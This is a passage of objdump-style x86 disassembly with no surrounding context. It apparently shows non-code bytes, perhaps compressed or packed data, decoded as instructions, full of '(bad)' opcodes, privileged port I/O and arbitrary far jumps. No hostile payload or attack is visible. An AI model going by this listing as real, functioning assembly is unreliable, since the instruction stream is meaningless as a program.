  4283b4:	fsub   st(4),st
  4283b6:	cli    
  4283b7:	push   eax
  4283b8:	inc    esp
  4283b9:	push   0xffffffde
  4283bb:	or     DWORD PTR [esi+0xc],edx
  4283be:	inc    eax
  4283bf:	shl    bh,1
  4283c1:	enter  0xaffb,0xfc
  4283c5:	push   0x26eefc3d
  4283ca:	fwait
  4283cb:	or     DWORD PTR [esi+0x54567a60],edi
  4283d1:	or     edi,DWORD PTR [ebx-0x29eb83a9]
  4283d7:	add    eax,0xaa04712d
  4283dc:	pop    ss
  4283dd:	xchg   ch,dh
  4283df:	push   esp
  4283e0:	fcom   DWORD PTR [ebx]
  4283e2:	push   ss
  4283e3:	out    dx,eax
  4283e4:	pushf  
  4283e5:	call   0x4092:0xa50a0b68
  4283ec:	hlt    
  4283ed:	cmp    eax,0xff818a27
  4283f2:	cmc    
  4283f3:	xor    dl,BYTE PTR [ebp-0x3dabddc4]
  4283f9:	jo     0x428438
  4283fb:	push   esi
  4283fc:	imul   ebx,DWORD PTR [edx+0x65281e46],0x26653a26
  428406:	les    esp,FWORD PTR [ecx+0x2c268741]
  42840c:	jmp    DWORD PTR [esi+0x8b26]
	...
  428472:	add    BYTE PTR [eax],al
  428474:	push   cs
  428475:	xchg   esp,eax
  428476:	jg     0x4284db
  428478:	(bad)  
  428479:	jmp    0x428499
  42847b:	std    
  42847c:	mov    edi,0xdfabfb32
  428481:	gs pop ecx
  428483:	sub    eax,DWORD PTR [eax-0x52]
  428486:	add    DWORD PTR [eax],eax
  428488:	add    al,0x1
  42848a:	add    BYTE PTR [eax],al
  42848c:	cmp    eax,0x2fdcc28
  428491:	out    0x8b,eax
  428493:	sub    al,0xa3
  428495:	enter  0xc8a,0x28
  428499:	popa   
  42849a:	sar    DWORD PTR [ebx+0x7f],1
  42849d:	out    dx,eax
  42849e:	ins    DWORD PTR es:[edi],dx
  42849f:	mov    eax,ds:0x9feef536
  4284a4:	mov    cl,0x97
  4284a6:	les    esp,FWORD PTR [edi-0x5639f5b1]
  4284ac:	adc    esp,DWORD PTR [ecx+0x1d]
  4284af:	mov    ecx,0x275d05a3
  4284b4:	mov    edx,0xccf6d142
  4284b9:	ins    DWORD PTR es:[edi],dx
  4284ba:	iret   
  4284bb:	xchg   ecx,eax
  4284bc:	inc    ebx
  4284bd:	jmp    0x534c:0xbfa13037
  4284c4:	sbb    cl,BYTE PTR [esi+0x5d]
  4284c7:	xchg   ebx,eax
  4284c8:	call   0x220c:0xc29156a9
  4284cf:	xchg   DWORD PTR [eax],edi
  4284d1:	jmp    0x4284db
  4284d3:	pop    ss
  4284d4:	pop    esi
  4284d5:	es add al,0xa0
  4284d8:	(bad)  
  4284d9:	fwait
  4284da:	cmp    ecx,DWORD PTR [edx-0x67]
  4284dd:	dec    edi
  4284de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4284df:	mov    dh,0x80
  4284e1:	sub    eax,DWORD PTR [edi+0xfd08d8b]
  4284e7:	inc    ebp
  4284e8:	ja     0x4284c9
  4284ea:	xor    edx,DWORD PTR [ebx]
  4284ec:	push   edi
  4284ed:	pop    eax
  4284ee:	or     al,0x79
  4284f0:	add    eax,0x39a3f1dd
  4284f5:	fldenv ds:0xd57260d1
  4284fb:	rcpps  xmm0,XMMWORD PTR [ebx-0x38b0dd53]
  428502:	xchg   ecx,eax
  428503:	stos   BYTE PTR es:[edi],al
  428504:	push   ds
  428505:	adc    al,0xd1
  428507:	xor    al,0x4d
  428509:	aad    0x4e
  42850b:	cmp    ecx,DWORD PTR [edx+eiz*8+0x3f]
  42850f:	inc    ebp
  428510:	jge    0x4284cf
  428512:	loopne 0x428590
  428514:	mov    WORD PTR [esi+0x14d6f448],ss
  42851a:	pusha  
  42851b:	les    ecx,FWORD PTR [ebp+0x4df01d67]
  428521:	push   ebp
  428522:	add    eax,0x77d4bafa
  428527:	aad    0x38
  428529:	shl    DWORD PTR [ebx+0x54],cl
  42852c:	fidivr DWORD PTR [ebp+0x40]
  42852f:	push   ebp
  428530:	pop    ds
  428531:	push   edx
  428532:	out    0xdb,al
  428534:	or     eax,0xd5b4b18e
  428539:	adc    eax,0x650f7080
  42853e:	mov    eax,ds:0xe957e3de
  428543:	ss pop es
  428545:	mov    DWORD PTR [ecx],ecx
  428547:	dec    edi
  428548:	and    al,0xb5
  42854a:	retf   0xda68
  42854d:	pop    ebp
  42854e:	pop    ss
  42854f:	int    0x45
  428551:	xor    al,0xe
  428553:	aaa    
  428554:	int    0x9b
  428556:	addr16 push 0x28
  428559:	test   al,0xa2
  42855b:	cmp    edx,esp
  42855d:	mov    esi,0x4dc18a7
  428562:	lock push ebp
  428564:	gs push ecx
  428566:	add    BYTE PTR [ecx],cl
  428568:	adc    BYTE PTR [ecx],al
  42856a:	pop    ds
  42856b:	lods   al,BYTE PTR ds:[esi]
  42856c:	adc    bl,dl
  42856e:	data16 (bad) 
  428571:	cwde   
  428572:	cs stos DWORD PTR es:[edi],eax
  428574:	bnd jl 0x42856f
  428577:	cmp    ebp,esp
  428579:	push   eax
  42857a:	fldcw  WORD PTR [ecx+0xa1c7320]
  428580:	and    DWORD PTR [eax],0xa7fa9fd8
  428586:	dec    ebx
  428587:	mov    BYTE PTR [edx-0x4c],cl
  42858a:	popa   
  42858b:	rcl    ah,cl
  42858d:	test   eax,0x482a
	...
  4285f2:	add    BYTE PTR [eax],al
  4285f4:	push   ecx
  4285f5:	div    BYTE PTR ds:0x5bffb73e
  4285fb:	inc    edi
  4285fd:	mov    esi,0x27e4a3f6
  428602:	stc    
  428603:	inc    BYTE PTR [edi+ebp*4+0x1]
  428607:	add    BYTE PTR [ecx+eax*1],al
  42860a:	add    BYTE PTR [eax],al
  42860c:	inc    ebp
  42860d:	push   esp
  42860e:	scas   eax,DWORD PTR es:[edi]
  42860f:	popf   
  428610:	xchg   ebx,eax
  428611:	call   0xdb24:0x9881d0a5
  428618:	sar    cl,0x1
  42861b:	rol    BYTE PTR [esi+ecx*8-0x5d486e69],cl
  428622:	adc    eax,0xddf73441
  428627:	retf   
  428628:	adc    edx,edi
  42862a:	mov    al,0xd0
  42862c:	shl    DWORD PTR [esi+0x73],1
  42862f:	mov    edi,0xf260c856
  428634:	mov    bl,0xf4
  428636:	fxch   st(1)
  428638:	fisubr DWORD PTR [esi-0x33608e24]
  42863e:	dec    ebx
  42863f:	cdq    
  428640:	add    ch,ah
  428642:	shl    DWORD PTR [esi],0x79
  428645:	sbb    al,0x1d
  428647:	stos   WORD PTR es:[edi],ax
  428649:	fwait
  42864a:	shr    BYTE PTR [ecx],0x7e
  42864d:	inc    ebp
  42864e:	xor    dl,dl
  428650:	push   esp
  428651:	cmc    
  428652:	push   cs
  428653:	mov    ebx,0xbd890d19
  428658:	and    eax,0xce8471d6
  42865d:	outs   dx,BYTE PTR ds:[esi]
  42865e:	mov    al,ds:0x9d2de7cb
  428663:	xchg   edi,eax
  428664:	jecxz  0x42867e
  428666:	aaa    
  428667:	(bad)
  42866a:	imul   ebx,DWORD PTR [esi+0x22],0xc
  42866e:	pop    ebx
  42866f:	fbstp  TBYTE PTR [ecx+0x6c]
  428672:	cmp    eax,0xfe58113b
  428677:	fcomp  DWORD PTR [eax-0x3a98bbf9]
  42867d:	pop    ds
  42867e:	adc    edx,esp
  428680:	es jmp 0xecb2:0xb23f462f
  428688:	xchg   esp,eax
  428689:	adc    BYTE PTR [ecx-0x62],bh
  42868c:	adc    ebp,esp
  42868e:	and    edx,esi
  428690:	jle    0x428657
  428692:	test   BYTE PTR [ebp-0x6d],al
  428695:	or     bh,BYTE PTR [esi+edi*8+0x190db7bf]
  42869c:	jne    0x4286ab
  42869e:	popa   
  42869f:	dec    ecx
  4286a0:	cmp    bh,ch
  4286a2:	and    al,0x30
  4286a4:	in     al,0x42
  4286a6:	xchg   ebx,eax
  4286a7:	sbb    BYTE PTR [edx],0xf6
  4286aa:	adc    BYTE PTR [edx],al
  4286ac:	jbe    0x428679
  4286ae:	out    0x94,eax
  4286b0:	add    ch,BYTE PTR [edx+0x16]
  4286b3:	add    edi,eax
  4286b5:	outs   dx,DWORD PTR ds:[esi]
  4286b6:	jb     0x428714
  4286b8:	loope  0x428704
  4286ba:	out    0xb3,eax
  4286bc:	sub    eax,0x21acad2a
  4286c1:	cmp    dl,al
  4286c3:	(bad)  
  4286c5:	mov    DWORD PTR [ebx-0x2f],ecx
  4286c8:	inc    eax
  4286c9:	popf   
  4286ca:	bnd jl 0x42870f
  4286cd:	push   ds
  4286ce:	jne    0x42872c
  4286d0:	mov    ebx,0x288ddefc
  4286d5:	dec    esi
  4286d6:	or     eax,DWORD PTR [ecx+ecx*8+0x54]
  4286da:	shl    BYTE PTR [edx+0x3da6d03d],cl
  4286e0:	add    ebp,DWORD PTR [edi]
  4286e2:	arpl   sp,di
  4286e4:	popa   
  4286e5:	pop    edx
  4286e6:	stc    
  4286e7:	sbb    bh,BYTE PTR [edi-0x74cce6f1]
  4286ed:	jle    0x42868f
  4286ef:	push   0x71c1fcea
  4286f4:	adc    al,0x54
  4286f6:	cs ret 
  4286f8:	adc    bh,BYTE PTR [ecx]
  4286fa:	sub    ch,BYTE PTR [esi+0x17d16571]
  428700:	mov    al,0x90
  428702:	(bad)  
  428703:	lods   eax,DWORD PTR ds:[esi]
  428704:	inc    esp
  428705:	pop    ebx
  428706:	push   edx
  428707:	pop    ebp
  428708:	js     0x428716
  42870a:	bound  ebx,QWORD PTR [ecx]
  42870c:	call   0xc167d4
	...
  428771:	add    BYTE PTR [eax],al
  428773:	add    BYTE PTR [esi+0x5b],dl
  428776:	xor    al,0x78
  428778:	cmp    eax,0xe77f5e7f
  42877d:	inc    ebp
  42877e:	call   0x6195ef96
  428783:	jp     0x4287cd
  428785:	mov    al,0x1
  428787:	add    BYTE PTR [ecx+eax*1],al
  42878a:	add    BYTE PTR [eax],al
  42878c:	fst    QWORD PTR [edx]
  42878e:	sub    esp,ebx
  428790:	jae    0x428764
  428792:	adc    DWORD PTR [ebp+0xe57a945],ecx
  428798:	jae    0x4287bd
  42879a:	mov    ds:0x823f64c2,eax
  42879f:	mov    dl,ch
  4287a1:	ds in  eax,0xa5
  4287a4:	(bad)  
  4287a6:	xchg   edx,eax
  4287a7:	xor    DWORD PTR [edi],0xc2804eee
  4287ad:	dec    ecx
  4287ae:	loop   0x42874f
  4287b0:	stos   BYTE PTR es:[edi],al
  4287b1:	ffree  st(6)
  4287b3:	fistp  DWORD PTR [edx]
  4287b5:	push   edi
  4287b6:	dec    edx
  4287b7:	clc    
  4287b8:	popf   
  4287b9:	(bad)  
  4287ba:	icebp  
  4287bb:	or     dh,cl
  4287bd:	jmp    0xca6aa947
  4287c2:	lock scas al,BYTE PTR es:[edi]
  4287c4:	loope  0x4287c7
  4287c6:	jle    0x42876e
  4287c8:	inc    ecx
  4287c9:	cdq    
  4287ca:	sub    eax,0xa55d9a63
  4287cf:	sub    edi,DWORD PTR [eax+0x28]
  4287d2:	and    ebx,esi
  4287d4:	xchg   ebp,eax
  4287d5:	adc    DWORD PTR [ebx],eax
  4287d7:	jg     0x428766
  4287d9:	sahf   
  4287da:	push   es
  4287db:	sub    BYTE PTR [eax-0x6b],cl
  4287de:	pop    ecx
  4287df:	outs   dx,DWORD PTR ds:[esi]
  4287e0:	shr    DWORD PTR [ecx-0x3231e995],cl
  4287e6:	sub    BYTE PTR [edx],ah
  4287e8:	and    edx,esp
  4287ea:	mov    esp,0x8e0a8105
  4287ef:	jae    0x428780
  4287f1:	rcr    DWORD PTR [esi],0x91
  4287f4:	aam    0xe5
  4287f6:	cmp    BYTE PTR [edx-0x6],bh
  4287f9:	call   0x4666:0xd834538d
  428800:	addr16 (bad) 
  428802:	or     esp,DWORD PTR [ecx+0x51]
  428805:	xor    esi,DWORD PTR ss:[ebx]
  428808:	test   al,0x55
  42880a:	out    0xf3,eax
  42880c:	ins    DWORD PTR es:[edi],dx
  42880d:	xor    eax,0x1b066295
  428812:	sub    esp,DWORD PTR [edi-0x68881c07]
  428818:	cdq    
  428819:	xor    BYTE PTR [ecx+0x53c7b848],dl
  42881f:	mov    cl,0x95
  428821:	arpl   WORD PTR ds:[esi],cx
  428824:	cmp    al,0x78
  428826:	or     BYTE PTR [ecx+edx*2],bl
  428829:	in     eax,dx
  42882a:	sbb    al,0x5e
  42882c:	and    BYTE PTR [ebx+edx*4-0x77],0x52
  428831:	inc    ebx
  428832:	pop    edi
  428833:	push   ebx
  428834:	gs ja  0x42880b
  428837:	mov    esi,0x221ccd31
  42883c:	out    0x4c,eax
  42883e:	ja     0x42885d
  428840:	out    dx,al
  428841:	lock xchg DWORD PTR [ebx+0x12],ebx
  428845:	push   ebp
  428846:	lds    esp,FWORD PTR [edi]
  428848:	mov    bl,0xf
  42884a:	pushf  
  42884b:	and    BYTE PTR [eax],ch
  42884d:	push   ecx
  42884e:	aam    0x70
  428850:	es xchg ecx,eax
  428852:	pop    ebx
  428853:	mov    edi,0x1885e3ce
  428858:	fistp  QWORD PTR [eax-0x22]
  42885b:	daa    
  42885c:	dec    esi
  42885d:	lods   eax,DWORD PTR ds:[esi]
  42885e:	and    dh,bl
  428860:	sub    eax,DWORD PTR [edx]
  428862:	dec    ecx
  428863:	jecxz  0x4288d4
  428865:	sbb    edi,DWORD PTR [ebx+0x37950e28]
  42886b:	out    dx,al
  42886c:	jg     0x42881d
  42886e:	adc    BYTE PTR [ecx+0x39],0xe2
  428872:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428873:	mov    dh,dh
  428875:	and    eax,0x51faf429
  42887a:	cmp    dl,BYTE PTR [edx]
  42887c:	dec    ebp
  42887d:	pop    esi
  42887e:	iret   
  42887f:	push   ss
  428880:	inc    edx
  428881:	cs mov bh,0xe8
  428884:	clc    
  428885:	jno    0x4288e3
  428887:	call   0x3bb24659
  42888c:	pushf  
  42888d:	mov    eax,eax
  42888f:	cmc    
	...
  4288f4:	es jp  0x428968
  4288f7:	les    edi,FWORD PTR [ebp-0x31]
  4288fa:	mov    bh,0xfa
  4288fc:	arpl   WORD PTR [esi+0x134a9d0f],bx
  428902:	or     eax,0x1b14c02
  428907:	add    BYTE PTR [ecx+eax*1],al
  42890a:	add    BYTE PTR [eax],al
  42890c:	mov    ds:0xf88343b9,eax
  428911:	rcl    DWORD PTR [ecx-0x2b],0xb7
  428915:	jb     0x428978
  428917:	fsubr  DWORD PTR ss:[esi+0x69]
  42891b:	cmp    cl,al
  42891d:	mov    al,0xe0
  42891f:	and    esi,edx
  428921:	pop    ecx
  428922:	dec    ebx
  428923:	or     al,0x64
  428925:	dec    edi
  428926:	aas    
  428927:	js     0x4288cd
  428929:	jl     0x428928
  42892b:	call   0xf402:0xdb66f1fc
  428932:	jnp    0x428911
  428934:	and    al,0xf9
  428936:	sti    
  428937:	arpl   WORD PTR [ebp-0x5d9699b],bx
  42893d:	inc    edi
  42893e:	mov    eax,0x60886784
  428943:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428944:	xor    BYTE PTR [edi+0x7518f022],dh
  42894a:	(bad)  
  42894c:	test   BYTE PTR [eax-0x239807c1],cl
  428952:	push   ds
  428953:	adc    ebx,DWORD PTR [ebx+0x754c6783]
  428959:	sti    
  42895a:	loop   0x4289a0
  42895c:	jecxz  0x4289b4
  42895e:	xchg   BYTE PTR [edx-0x4],bh
  428961:	test   DWORD PTR [edi],ecx
  428963:	in     eax,0xb0
  428965:	mov    ebx,0x4f8d2bcb
  42896a:	fsubr  DWORD PTR [eax]
  42896c:	out    0x9f,eax
  42896e:	outs   dx,DWORD PTR ds:[esi]
  42896f:	sbb    BYTE PTR [ecx-0x26a9995c],bh
  428975:	mov    ecx,eax
  428977:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428978:	mov    eax,ds:0xc3c49ef0
  42897d:	xchg   ebx,eax
  42897e:	xor    eax,0xa1d34594
  428983:	push   0xffffffa5
  428985:	jno    0x42898b
  428987:	dec    edx
  428988:	push   cs
  428989:	shl    DWORD PTR [ebx+0x1a62ffe4],0x7b
  428990:	mov    dl,0x44
  428992:	cli    
  428993:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428994:	sbb    dh,bh
  428996:	mov    edx,0x46825e32
  42899b:	mov    eax,ds:0xec4d3409
  4289a0:	mov    eax,0x3b7e95a1
  4289a5:	or     bh,BYTE PTR [edx+0x5cba6aad]
  4289ab:	out    0x55,al
  4289ad:	std    
  4289ae:	sbb    dh,dl
  4289b0:	xchg   esi,eax
  4289b1:	pop    esi
  4289b2:	xlat   BYTE PTR ds:[ebx]
  4289b3:	push   esi
  4289b4:	inc    ebp
  4289b5:	addr16 mov eax,ds:0x4861
  4289b9:	fcomp  QWORD PTR [ecx]
  4289bb:	sbb    al,0xf1
  4289bd:	addr16 xchg ecx,eax
  4289bf:	xor    edx,esi
  4289c1:	fsubr  st,st(6)
  4289c3:	scas   al,BYTE PTR es:[edi]
  4289c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4289c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4289c6:	dec    esp
  4289c7:	adc    al,0xf7
  4289c9:	pusha  
  4289ca:	pop    es
  4289cb:	loopne 0x428991
  4289cd:	ins    BYTE PTR es:[edi],dx
  4289ce:	mov    ecx,0xf9063310
  4289d3:	sahf   
  4289d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4289d5:	sbb    eax,0x2f277634
  4289da:	push   ds
  4289db:	lods   al,BYTE PTR ds:[esi]
  4289dc:	push   esp
  4289dd:	pop    edx
  4289de:	js     0x428a4e
  4289e0:	dec    edi
  4289e1:	cli    
  4289e2:	mov    ah,0x72
  4289e4:	mov    eax,0x80aeb967
  4289e9:	cdq    
  4289ea:	sbb    DWORD PTR [edx],0x65
  4289ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4289ee:	xchg   BYTE PTR [ebx+edx*4-0x73],ch
  4289f2:	pop    edi
  4289f3:	xchg   DWORD PTR [ebx+0x3dfa4a5e],edx
  4289f9:	add    esi,DWORD PTR [edi+0x40e25d81]
  4289ff:	ja     0x428a67
  428a01:	pop    edx
  428a02:	dec    ecx
  428a03:	(bad)
  428a06:	and    DWORD PTR [ebx+0x36],0x6c
  428a0a:	add    al,0x41
  428a0c:	xchg   edx,eax
  428a0d:	mov    ch,0x4b
  428a0f:	jnp    0x428a11
	...
  428a71:	add    BYTE PTR [eax],al
  428a73:	add    BYTE PTR [ebp+0xc],cl
  428a76:	clc    
  428a77:	pop    ebx
  428a78:	stc    
  428a79:	(bad)  
  428a7a:	out    dx,eax
  428a7b:	push   ds
  428a7c:	pop    ds
  428a7d:	bound  edx,QWORD PTR [eax-0x4c9858ed]
  428a83:	dec    edi
  428a84:	push   eax
  428a85:	mov    dl,0x1
  428a87:	add    BYTE PTR [ecx+eax*1],al
  428a8a:	add    BYTE PTR [eax],al
  428a8c:	into   
  428a8d:	add    eax,0xda88f849
  428a92:	mov    ds:0x9698db79,eax
  428a97:	repnz and al,0xb2
  428a9a:	inc    eax
  428a9b:	jnp    0x428ab0
  428a9d:	xor    al,0x8
  428a9f:	fld    DWORD PTR [eax+eiz*8]
  428aa2:	adc    al,bh
  428aa4:	pop    ds
  428aa5:	sub    dl,BYTE PTR ds:0x5bb5f2ad
  428aab:	push   cs
  428aac:	lock addr16 das 
  428aaf:	inc    ecx
  428ab0:	cmp    eax,0x55b9141d
  428ab5:	xchg   edx,eax
  428ab6:	sbb    eax,0x237dbf51
  428abb:	iret   
  428abc:	dec    ebx
  428abd:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428abf:	clc    
  428ac0:	out    0x5e,al
  428ac2:	cli    
  428ac3:	ds fs jne 0x428a74
  428ac7:	mov    DWORD PTR [edi],edx
  428ac9:	sbb    ch,BYTE PTR [edx-0x6fe8265a]
  428acf:	mov    esp,DWORD PTR [edx+0x7c2a10e7]
  428ad5:	mov    ah,0x27
  428ad7:	pop    esp
  428ad8:	cwde   
  428ad9:	retf   0x207c
  428adc:	imul   edi,DWORD PTR [edx],0xbfe1be87
  428ae2:	jl     0x428aee
  428ae4:	jnp    0x428b2f
  428ae6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428ae7:	pop    ds
  428ae8:	pop    edi
  428ae9:	into   
  428aea:	adc    edi,DWORD PTR ds:0x9b65c285
  428af0:	xor    BYTE PTR [edi-0x73fff056],dh
  428af6:	(bad)  
  428af7:	stc    
  428af8:	jmp    0x2edea609
  428afd:	inc    eax
  428afe:	xchg   BYTE PTR [edi+edx*1],ah
  428b01:	sbb    cl,BYTE PTR [ecx+0x1e]
  428b04:	push   ecx
  428b05:	jb     0x428b59
  428b07:	ror    esi,cl
  428b09:	sahf   
  428b0a:	(bad)  
  428b0b:	xor    esi,DWORD PTR [edi-0x27]
  428b0e:	stc    
  428b0f:	push   es
  428b10:	jo     0x428b7e
  428b12:	leave  
  428b13:	jmp    0x428b27
  428b15:	popa   
  428b16:	dec    edx
  428b17:	jae    0x428ac3
  428b19:	or     al,0xa1
  428b1b:	cdq    
  428b1c:	test   al,0x85
  428b1e:	mov    bh,dh
  428b20:	xchg   edi,eax
  428b21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428b22:	mov    bl,0xf6
  428b24:	mov    DWORD PTR [edi],esi
  428b26:	mov    edi,0xca3f6f37
  428b2b:	mov    esp,0x5e358470
  428b30:	xchg   esp,eax
  428b31:	fnstenv [ebx]
  428b33:	xor    BYTE PTR [edi-0x6b],0xd7
  428b37:	mov    bl,ah
  428b39:	repz mov dh,0x76
  428b3c:	sti    
  428b3d:	mov    ebx,0x7f48ec62
  428b42:	cmp    eax,0x4110dfe1
  428b47:	push   cs
  428b48:	mov    ebx,0xf66e6610
  428b4d:	leave  
  428b4e:	cmp    esp,DWORD PTR [ecx]
  428b50:	or     eax,DWORD PTR [ebx-0x160dba7a]
  428b56:	mov    bl,0x24
  428b58:	sbb    BYTE PTR [edi+0x1667c15f],ch
  428b5e:	dec    edi
  428b5f:	imul   esi,DWORD PTR [ebx],0x22
  428b62:	cmp    DWORD PTR [ebp-0x18],edi
  428b65:	or     BYTE PTR [ebx-0x74],ch
  428b68:	scas   al,BYTE PTR es:[edi]
  428b69:	inc    edx
  428b6a:	mov    ebx,0x75f87707
  428b6f:	pop    esp
  428b70:	mov    eax,0x9ed45ab3
  428b75:	leave  
  428b76:	xchg   ebx,eax
  428b77:	sub    BYTE PTR [edi-0x64f623d9],al
  428b7d:	jb     0x428b72
  428b7f:	test   al,0xba
  428b81:	ds inc ecx
  428b83:	sub    DWORD PTR [edi],0xd3433c5c
  428b89:	jp     0x428bb7
  428b8b:	or     esi,edi
  428b8d:	neg    edx
  428b8f:	mov    es,WORD PTR [eax]
	...
  428bf1:	add    BYTE PTR [eax],al
  428bf3:	add    ch,al
  428bf5:	push   ebp
  428bf6:	mov    bh,dl
  428bf8:	call   0xbbc:0x947ff5ff
  428bff:	push   0xf4fb0695
  428c04:	push   esp
  428c05:	mov    bl,0x1
  428c07:	add    BYTE PTR [ecx+eax*1],al
  428c0a:	add    BYTE PTR [eax],al
  428c0c:	xchg   DWORD PTR [edx-0x6c],ebp
  428c0f:	dec    edi
  428c10:	or     eax,0xa64dae03
  428c15:	xchg   DWORD PTR es:[ecx+0x60],eax
  428c19:	mov    bh,0x57
  428c1b:	adc    DWORD PTR [eax],ebp
  428c1d:	add    bl,BYTE PTR [esi]
  428c1f:	inc    edx
  428c20:	sub    ebp,esi
  428c22:	mov    gs,WORD PTR [edx-0x7b]
  428c25:	retf   0xc8e8
  428c28:	shl    DWORD PTR [edx-0x36a35f07],0x51
  428c2f:	jo     0x428bf1
  428c31:	aas    
  428c32:	leave  
  428c33:	(bad)  
  428c34:	xchg   ebp,eax
  428c35:	sbb    ecx,eax
  428c37:	cli    
  428c38:	nop
  428c39:	sub    eax,0x74eb2719
  428c3e:	xchg   ebp,eax
  428c3f:	test   DWORD PTR [ebp-0x75],esp
  428c42:	xchg   ebx,eax
  428c43:	hlt    
  428c44:	inc    edi
  428c45:	arpl   WORD PTR [edi+ebx*8],bp
  428c48:	in     al,0x15
  428c4a:	cmp    esi,DWORD PTR [esi+0x14499fd0]
  428c50:	nop
  428c51:	call   0xae11:0x49e232ab
  428c58:	pop    edi
  428c59:	(bad)  
  428c5b:	mov    BYTE PTR [ebx],al
  428c5d:	in     al,0x6b
  428c5f:	xor    dl,0xec
  428c62:	sub    cl,BYTE PTR [eax-0x7916de07]
  428c68:	iretw  
  428c6a:	inc    esp
  428c6b:	(bad)  
  428c6c:	fnsave [ebx]
  428c6e:	mov    ecx,0xc787b7c5
  428c73:	sub    al,0x7d
  428c75:	push   ecx
  428c76:	mov    BYTE PTR [eax-0x59],bl
  428c79:	push   0x3905d9c7
  428c7e:	cmp    bl,BYTE PTR [eax]
  428c80:	dec    ecx
  428c81:	ins    BYTE PTR es:[edi],dx
  428c82:	or     eax,0xec85189b
  428c87:	pushf  
  428c88:	inc    BYTE PTR [ebp+0x6f0fd006]
  428c8e:	push   eax
  428c8f:	push   0xffffffec
  428c91:	sahf   
  428c92:	out    0x14,eax
  428c94:	and    BYTE PTR [edi-0x1db95ad0],bl
  428c9a:	sub    DWORD PTR [ebx-0x3a],eax
  428c9d:	(bad)  
  428c9f:	push   0x53
  428ca1:	retf   
  428ca2:	cld    
  428ca3:	jmp    0xd80e591e
  428ca8:	cmp    DWORD PTR [edx+0x44d9d0a6],edx
  428cae:	cmp    DWORD PTR [ebp-0x3],ebp
  428cb1:	pop    ecx
  428cb2:	sub    DWORD PTR ds:0x47c58922,0xd3121587
  428cbc:	leave  
  428cbd:	bound  ebp,QWORD PTR [esi+0x44c7a34e]
  428cc3:	popa   
  428cc4:	xor    eax,0xbc70cfa8
  428cc9:	popa   
  428cca:	pushf  
  428ccb:	mov    al,0x11
  428ccd:	inc    eax
  428cce:	outs   dx,DWORD PTR ds:[esi]
  428ccf:	push   ebx
  428cd0:	dec    esp
  428cd1:	and    BYTE PTR [edi],ch
  428cd3:	ja     0x428d42
  428cd5:	inc    edx
  428cd6:	cmp    bh,BYTE PTR [edx-0x5823891c]
  428cdc:	or     bh,BYTE PTR [edx+0x5ea0ee5c]
  428ce2:	hlt    
  428ce3:	sbb    bh,bl
  428ce5:	jb     0x428cd0
  428ce7:	mov    bl,0x69
  428ce9:	xor    BYTE PTR [edx-0x4e6f15e1],dh
  428cef:	push   0xf776dd8a
  428cf4:	imul   edi,DWORD PTR [edx],0xd40db746
  428cfa:	sub    al,0xe1
  428cfc:	adc    al,0xf7
  428cfe:	mov    esp,0x328f5189
  428d03:	or     dh,ah
  428d05:	test   al,0x95
  428d07:	inc    esi
  428d08:	xlat   BYTE PTR ds:[ebx]
  428d09:	mov    ebx,0x5892947d
  428d0e:	xchg   edx,eax
  428d0f:	add    al,0x0
	...
  428d71:	add    BYTE PTR [eax],al
  428d73:	add    BYTE PTR [ecx-0xace0e4b],al
  428d79:	jne    0x428d3c
  428d7b:	mov    ch,0x90
  428d7d:	int3   
  428d7e:	ins    BYTE PTR es:[edi],dx
  428d7f:	retf   0x282a
  428d82:	pop    esi
  428d83:	mov    esi,0x1b458
  428d88:	add    al,0x1
  428d8a:	add    BYTE PTR [eax],al
  428d8c:	mov    esp,0xdf27d4c9
  428d91:	in     eax,dx
  428d92:	das    
  428d93:	jno    0x428d76
  428d95:	push   esp
  428d96:	test   dh,ch
  428d98:	inc    esp
  428d99:	aaa    
  428d9a:	test   dh,cl
  428d9c:	aas    
  428d9d:	jle    0x428d84
  428d9f:	in     al,0x48
  428da1:	pop    ss
  428da2:	lods   eax,DWORD PTR ds:[esi]
  428da3:	ret    0xc325
  428da6:	jns    0x428d88
  428da8:	mov    dl,0x36
  428daa:	ret    0x5caf
  428dad:	scas   eax,DWORD PTR es:[edi]
  428dae:	push   ebp
  428daf:	xor    BYTE PTR [ecx+0x73],ah
  428db2:	(bad)
  428db5:	jecxz  0x428dac
  428db7:	enter  0xb7b2,0x61
  428dbb:	add    BYTE PTR [edi+0x54437e52],ah
  428dc1:	xchg   edi,ebp
  428dc3:	loope  0x428e44
  428dc5:	jne    0x428dd8
  428dc7:	adc    ch,BYTE PTR [edx-0x1c5e3017]
  428dcd:	ret    0x9253
  428dd0:	xor    cl,bh
  428dd2:	stos   BYTE PTR es:[edi],al
  428dd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428dd4:	lahf   
  428dd5:	dec    esi
  428dd6:	and    DWORD PTR [edx],0xdd74d21e
  428ddc:	repz out 0xe8,eax
  428ddf:	in     al,dx
  428de0:	jmp    0x428e4d
  428de2:	and    al,0xe5
  428de4:	inc    eax
  428de5:	and    DWORD PTR [eax+0x6d58e040],edi
  428deb:	rol    DWORD PTR [eax-0x754f4b53],cl
  428df1:	jno    0x428e61
  428df3:	mov    WORD PTR [edi],es
  428df5:	dec    edi
  428df6:	mov    DWORD PTR [eax],eax
  428df8:	xor    eax,0x99c5e4cf
  428dfd:	pop    eax
  428dfe:	or     ah,0x78
  428e01:	stos   DWORD PTR es:[edi],eax
  428e02:	sbb    ah,BYTE PTR [edi+0x4e480f6e]
  428e08:	scas   al,BYTE PTR es:[edi]
  428e09:	adc    cl,BYTE PTR [ecx+0x2e3c7d1d]
  428e0f:	mov    al,ds:0x1c126f7e
  428e14:	inc    ebp
  428e15:	cmp    al,0x91
  428e17:	inc    esp
  428e18:	daa    
  428e19:	xchg   DWORD PTR [ebx],eax
  428e1b:	mov    eax,0x60338d8b
  428e20:	lea    edi,[ebx]
  428e22:	popa   
  428e23:	repz and eax,0x4ab7e732
  428e29:	pop    edx
